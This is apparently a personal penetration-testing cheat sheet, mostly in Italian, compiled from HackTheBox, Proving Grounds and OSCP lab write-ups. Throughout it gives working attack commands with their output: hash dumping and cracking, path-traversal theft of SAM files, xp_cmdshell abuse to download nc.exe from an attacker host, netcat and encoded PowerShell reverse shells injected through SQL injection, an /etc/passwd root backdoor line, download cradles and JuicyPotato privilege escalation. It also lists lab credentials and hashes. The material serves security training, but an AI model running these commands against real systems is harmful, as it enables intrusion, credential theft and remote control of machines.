tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```
E poi:
```
C:\hashcat-3.5.0> .\hashcat64.exe -m 13400 .\timhash.txt .\rockyou.txt
```

### Fcrackzip
```
root@kali:~/htb/tally# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt orcharddb.zip 
```


### Powershell
https://zeyu2001.gitbook.io/pentesting/proving-grounds/get-to-work/nickel

Per eseguire una richiesta web e vedere la risposta:
```
PS C:\> $Resp = Invoke-WebRequest -Uri "http://nickel/?localgroup Administrators ariah /add" -UseBasicParsing
PS C:\> $Resp.RawCOntent
```

Vedi Nickel Providing Grounds.
Con questo metodo ho fatto la reverse shell.


### Dump Hashes
Vedi esempio: https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html

Se, per esempio, si trova un file .dit con un file .bin
```
tomcat@kotarak-dmz:/home/tomcat$ find . -type f
./to_archive/pentest_data/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
./to_archive/pentest_data/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
```
The .bin reports to be a Windows registry file, where as file doesn’t recognize the .dit as anything more than data:
```
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ file *
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
```

**secretsdump** will extract all the hashes from an **ntds.dit** file using the SYSTEM reg hive to decrypt:
```
oxdf@parrot$ secretsdump.py -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL | tee addump
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient                                           
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
...[snip]...
```

Poi si prendono solo gli hash NTML:
```
oxdf@parrot$ cat addump | grep ":::" | cut -d: -f4
e64fe0f24ba2489c05e64354d74ebd11
31d6cfe0d16ae931b73c59d7e0c089c0
668d49ebfdb70aeee8bcaeac9e3e66fd
ca1ccefcb525db49828fbb9d68298eee
160f6c1db2ce0994c19c46a349611487
6f5e87fd20d1d8753896f6c9cb316279
cdd7a7f43d06b3a91705900a592f3772
24473180acbcc5f7d2731abe05cfa88c
2b576acbe6bcfda7294d6bd18041b8fe
```

E poi si possono crackare (pure con https://crackstation.net/).


Oppure:
```
1. Get the SAM - wget http://IP/..%5C..%5C..%5C..%5C..%5CWindows..%5CSystem32..%5Cconfig..%5CRegBack..%5CSAM.OLD -O sam.old
2. Get the SYSTEM - wget http://IP/..%5C..%5C..%5C..%5C..%5CWindows..%5CSystem32..%5Cconfig..%5CRegBack..%5CSYSTEM.OLD -O system.old
3. pwdump system.old sam.old and you will get the Hashes
4. Brute it with john
```

### SQLServer
Meathead di Providing Grounds.
https://zeyu2001.gitbook.io/pentesting/proving-grounds/try-harder/meathead

Login:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds]
└─$ mssql-cli -S 192.168.128.70,1435 -U sa -P EjectFrailtyThorn425
master> 
```

Esecuzione comandi con xp_cmdshell
Carico nc.exe
```
master> xp_cmdshell 'powershell -nop -exec bypass -c "IEX(New-Object System.Net.WebClient).DownloadFile(
....... \"http://192.168.49.128:1221/nc.exe\", \"C:\Users\Public\nc.exe\")"'                            
Time: 1.823s (a second)
+------------------------------------------------------------------------------------------------------>
| output                                                                                               >
|------------------------------------------------------------------------------------------------------>
| Invoke-Expression : Cannot bind argument to parameter 'Command' because it is null.                  >
| At line:1 char:4                                                                                     >
| + IEX(New-Object System.Net.WebClient).DownloadFile("http://192.168.49. ...                          >
| +    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                              >
|     + CategoryInfo          : InvalidData: (:) [Invoke-Expression], ParameterBindingValidationExcepti>
|     + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Com>
|    ssionCommand                                                                                      >
|                                                                                                      >
| NULL                                                                                                 >
+------------------------------------------------------------------------------------------------------>
(9 rows affected)
```

Anche se mi dà errore lo ha caricato (ho fatto un dir sempre con xp_cmdshell)
Eseguo reverse shell:
```
master> xp_cmdshell 'C:\Users\Public\nc.exe 192.168.49.128 80 -e cmd.exe' 
```

Se xp_cmdshell dovesse dare problemi:
https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/
Esempio (preso da lab OSCP: Ralph):
```
 1> EXEC master..xp_cmdshell 'whoami'
    2> go
    Msg 15281, Level 16, State 1
    Server 'RALPH\SQLEXPRESS', Procedure 'master..xp_cmdshell', Line 1
    SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is
    turned off as part of the security configuration for this server. A system administrator can enable the use of
    'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell'
    in SQL Server Books Online.

To fix this error, (https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/) run:

    1> sp_configure 'show advanced options', '1'
    2> RECONFIGURE
    3> go
    Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
    (return status = 0)
    1> sp_configure 'xp_cmdshell', '1' 
    2> RECONFIGURE
    3> go
    Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
    (return status = 0)

And we can run command:

    1> xp_cmdshell 'whoami'
    2> go
```

**Per Windows**
https://www.absolomb.com/2018-05-04-HackTheBox-Tally/


### GPP Password
https://0xdf.gitlab.io/2018/12/08/htb-active.html

Viene trovata tramite SMB:
```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml     
```

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

Per decriptare si usa **gpp-decrypt**:
```
root@kali:~/hackthebox/active-10.10.10.100/smb-loot# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

### Kerberoasting
https://0xdf.gitlab.io/2018/12/08/htb-active.html

**Get Hash**:
```
root@kali:~/hackthebox/active-10.10.10.100# GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40  2018-07-21 11:05:53 
```

```
root@kali:~/hackthebox/active-10.10.10.100# cat GetUserSPNs.out 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174
```

Decrypt with Hashcat
```
~/Dropbox/CTFs/hackthebox/active-10.10.10.100$ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force                                       
hashcat (v4.0.1) starting... 
...snip...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9
184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174:Ticketmaster1968
```

E poi si può usare **psexec.py** per avere una shell:
```
root@kali:~/hackthebox/active-10.10.10.100# psexec.py active.htb/administrator@10.10.10.100
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file dMCaaHzA.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service aYMa on 10.10.10.100.....
[*] Starting service aYMa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

#### Con SQLi
(Vedi Dj writeup dell'OSCP)
Volendo si può concatenare nella SQLi con EXEC e dargli xp_cmdshell per eseguire comando. Se non si hanno credenziali per accedere al db ma si ha una SQLi.
```
We can use xp_cmdshell to run command, but first we must abilitate:

' UNION SELECT NULL,NULL; EXEC sp_configure 'show advanced options', 1; -- 
' UNION SELECT NULL,NULL; RECONFIGURE; --
' UNION SELECT NULL,NULL; EXEC sp_configure 'xp_cmdshell', 1; --
' UNION SELECT NULL,NULL; RECONFIGURE; --

We run the ping to test:
' UNION SELECT NULL,NULL; EXEC xp_cmdshell 'ping 192.168.119.168'; --

We receive the ping:

## Access
We can use powershell to do a reverse shell:

    ' UNION SELECT NULL,NULL; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA2ADgAIgAsADcANwA3ADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'; --
```


### Tips & Trick
- Al post del comando "ls" si può usare "echo \*" per listare il contenuto di una cartella

- echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd

- Invertire un file ```tac fsocity.dic > fsocity.dic.reverse```


### Upload 
- Windows

powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.199/accesschk.exe' -OutFile 'accesschk.exe'"

powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3:21/win.exe', 'C:\Users\daisy\Desktop\win.exe')"

Se si hanno le credenziali ssh:
scp shell.exe ariah@192.168.231.99:C:\\users\\ariah\\desktop\\shell.exe

### Worpress

Let's scan workpress
$ wpscan --disable-tls-checks --url https://192.168.190.131:12380/blogblog/ --enumerate u
$ wpscan --disable-tls-checks --url https://192.168.190.131:12380/blogblog/ --enumerate p
$ wpscan --url https://192.168.1.13:12380/blogblog/ --enumerate uap

**p,t,u** to enumerate plugins, themes, and users:
wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u | tee wpscan.log


#### Gwolle Guestbook v 1.5.3

Questo plugin è affetto da RFI: https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html


#### wordpress advanced video

searchsploit wordpress advanced video

$ cat /usr/share/exploitdb/platforms/php/webapps/39646.py

edit the script to the wordpress ip and folder 
then execute 

then go to https://192.168.190.131:12380/blogblog/wp-content/uploads/
and download the image 520019578.jpeg



#### Change Shell 
then I changed the shell 

```
$ sudo usermod -s /bin/bash peter
$ sudo -i
```

Man **usermod**:
-s, --shell SHELL
    The name of the user's new login shell. Setting this field to blank causes the system to select the default login shell. 

Man **sudo**:
-i [command]
The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell's -c option. If no command is specified, an interactive shell is executed. sudo attempts to change to that user's home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use. 


The above command changes the user to scriptmanager user:
```
sudo -i -u scriptmanager
```

oppure:
```
sudo -u scriptmanager /bin/bash
```


### SSL error (script python, per https)

Upon downloading the exploit, and running it, I was presented with an SSL error… So I went ahead and edited the code to include the following

```
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
```

vedi anche: https://github.com/gtech/39646/blob/master/39646.py



### Recursive cat
find -name ".bash_history" -exec cat {} \;


### Linux Kernel 4.4.x (Ubuntu 16.04) – double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit (http://www.mrb3n.com/?p=81)

This particular kernel version appeared to be vulnerable to the following kernel exploit: https://www.exploit-db.com/exploits/39772/



### Windows Exploits (alcuni)

https://github.com/WindowsExploits/Exploits


### Certutil (Windows - per download)

certutil -urlcache -split -f "http://$IP/$FILE" $NOME_FILE


### JuicyPotato
Vedi anche AuthBy di Providing Grounds.
Spiegazione presa da (https://www.youtube.com/watch?v=gz3_qRL0JJo)

Vedi anche: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

https://github.com/ohpe/juicy-potato
https://github.com/ohpe/juicy-potato/releases

Puoi eseguire semplicemente: (è più semplice e poi se per esempio non c'è poweshell per lo script shell.ps1)
```
jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.49.114 3389" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

Prima si mette in ascolto la mia macchina (nc -lnvp 443), poi si fa l'upload di JuicyPotato.exe e di shell.bat sulla macchina vittima e poi si esegue sulla macchina vittima:
```
JuicyPotato.exe -l 443 -p shell.bat -t *
```

In shell.bat:
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://$IP/shell.ps1'))"
```

In shell.ps1: (è una reverse shell, presa da https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)


Oppure si può uploadare nc.exe e scrivere semplicemente in shell.ps1:
```
nc.exe -e cmd.exe $IP $PORT
``` 

Volendo, se si volesse eseguire una command line (senza un file shell.bat), si può fare:
```
JuicyPotato.exe -l 443 -p C:\Windows\system32\cmd.exe -t *
```

Se dovesse dare errore, potrebbe ssere perchp si deve settare il CLSID (si prende dal link di JuicyPotato (con tutte le parentesi graffe), in base alla versione del sistema) e poi si setta:

L'errore è **COM -> recv failed with error: 10038**

```
JuicyPotato.exe -l 443 -p shell.bat -t * -c  "$CLSID"
```

C'è anche uno script powershell per trovare il CLSID https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
In questo link https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505 viene usato ma solo la prima parte!


- Per questa vuln esiste anche PrintSpoofer https://github.com/itm4n/PrintSpoofer


#### Esempio

Sulla mia macchina mi metto nel path **~/Programs/JuicyPotato** e avvio server python (così posso uploadare i file che mi servono sulla macchina vittima)
```
┌──(kali㉿kali)-[~/Programs/JuicyPotato]
└─$ sudo python -m SimpleHTTPServer 80
```

Poi avvio anche un listener (che mi servirà quando eseguo JuicyPotato):
```
nc -lnvp 4444
```

N.B. 
	- Nello script **shell.bat** bisogna modificare IP e PORT che devono essere quelli del server python
	- Nello script **shell.ps1** nell'ultima riga bisogna modificare IP e PORT perchè è questo che crea la reverse shell

shell.ps1 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Macchina vittima:

```
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/JuicyPotato.exe" jp.exe

****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/shell.bat" shell.bat
****  Online  ****
  0000  ...
  0065
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/shell.ps1" shell.ps1
****  Online  ****
  0000  ...
  1128
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> dir


    Directory: C:\Users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            
-a---          6/2/2021   3:28 PM     347648 jp.exe                            
-a---          6/2/2021   3:29 PM        101 shell.bat                         
-a---          6/2/2021   3:29 PM       4392 shell.ps1                         


PS C:\Users\bruce> .\jp.exe -l 4444 -p shell.bat -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
COM -> recv failed with error: 10038
PS C:\Users\bruce> systeminfo

Host Name:                 ALFRED
OS Name:                   Microsoft Windows 7 Ultimate 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          bruce
Registered Organization:   
Product ID:                00426-OEM-9154295-64842
Original Install Date:     10/25/2019, 9:51:08 PM
System Boot Time:          6/2/2021, 3:22:00 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2394 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,184 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,107 MB
Virtual Memory: In Use:    988 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.107.63
                                 [02]: fe80::29a7:2281:ed40:a2b9

PS C:\Users\bruce> .\jp.exe -l 4444 -p shell.bat -t * -c "{555F3418-D99E-4E51-800A-6E89CFD8B1D7}"
Testing {555F3418-D99E-4E51-800A-6E89CFD8B1D7} 4444
......
[+] authresult 0
{555F3418-D99E-4E51-800A-6E89CFD8B1D7};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```



Se voglio eseguire lo script per trovare i CLSID, ho una versione semplificata rispetto a quella che si trova sul github di JuicyPotato
Il file si trova in **~/Programs/JuicyPotato/getCLSID_semplificato.ps1**

Dalla macchina vittima:

```
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/getCLSID_semplificato.ps1" getCLSID.ps1
****  Online  ****
  0000  ...
  011c
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> .\getCLSID.ps1

WARNING: column "CurrentLocation" does not fit into the display and was removed
.

Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
HKCR                                   Registry      HKEY_CLASSES_ROOT         
Looking for CLSIDs
{00021401-0000-0000-C000-000000000046}
{000C101C-0000-0000-C000-000000000046}
{0010890e-8789-413c-adbc-48f5b511b3af}
{00393519-3A67-4507-A2B8-85146167ACA7}
{00597829-82CE-44d4-8B0B-40BE695973B5}
{00BC7EAE-28D5-4310-BE9F-11526A7FA37F}
{00f2b433-44e4-4d88-b2b0-2698a0a91dba}
{010911E2-F61C-479B-B08C-43E6D1299EFE}
{0289a7c5-91bf-4547-81ae-fec91a89dec5}
{031EE060-67BC-460d-8847-E4A7C5E45A27}
{0365BE92-BD3F-47f5-8BB6-2EEF7AF5CAE7}
{03837511-098B-11D8-9414-505054503030}

[...]
```


Per questo script, ho avuto un errore:
```
PS C:\Users\bruce> .\getCLSID.ps1
****  Online  ****
  0000  ...
  062c
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> Invoke-PowerShellTcp : File C:\Users\bruce\getCLSID.ps1 cannot be loaded becaus
e the execution of scripts is disabled on this system. Please see "get-help abo
ut_signing" for more details.
At line:1 char:119
+ iex (New-Object Net.WebClient).DownloadString('http://10.8.80.159:8000/Invoke
-PowerShellTcp.ps1');Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.8.80.159
 -Port 5555
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
```

Ho risolto eseguendo il comando ```Set-ExecutionPolicy RemoteSigned``` da **ADMIN** (ovviamente dopo aver eseguito JuicyPotato, ma era per testare lo script). Quindi se dovesse dare questo errore, serve essere admin.


### PrintSpoofer
Per vulnerabilità di SeImpersonatePrivileges

https://github.com/itm4n/PrintSpoofer


### churrasco
Per vulnerabilità di SeImpersonatePrivileges
https://github.com/Re4son/Churrasco/
